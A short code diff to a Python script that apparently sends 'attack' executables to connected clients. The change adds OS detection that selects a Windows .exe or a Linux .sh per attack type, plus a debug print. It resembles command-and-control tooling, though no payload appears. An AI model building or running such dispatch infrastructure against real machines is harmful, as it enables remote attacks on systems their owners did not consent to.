@@ -34,6 +34,7 @@ def format_attack_data(type, id, data):
 
 def execute_attack(client, attack):
     print("sending attack to " + str(client['addr']))
+    print(client)
 
      # Récupération des données de l'attaque
     attack_data = json.loads(attack[5])
@@ -62,11 +63,11 @@ def execute_attack(client, attack):
             # envoyer l'exécutable 
             print("Le client n'a pas l'exécutable")
             attack_type = attack[2]
-            # Récupérer os du client 
-            # if os == "Windows":
-            #     executable_path = 'actions/windows/' + attack_type + '.exe'
-            # else:
-            executable_path = 'actions/linux/' + attack_type + '.sh'
+            #Récupérer os du client 
+            if client['os'] == "windows":
+                executable_path = 'actions/windows/' + attack_type + '.exe'
+            else:
+                executable_path = 'actions/linux/' + attack_type + '.sh'
 
             if os.path.isfile(executable_path):
                 with open(executable_path, 'rb') as f:
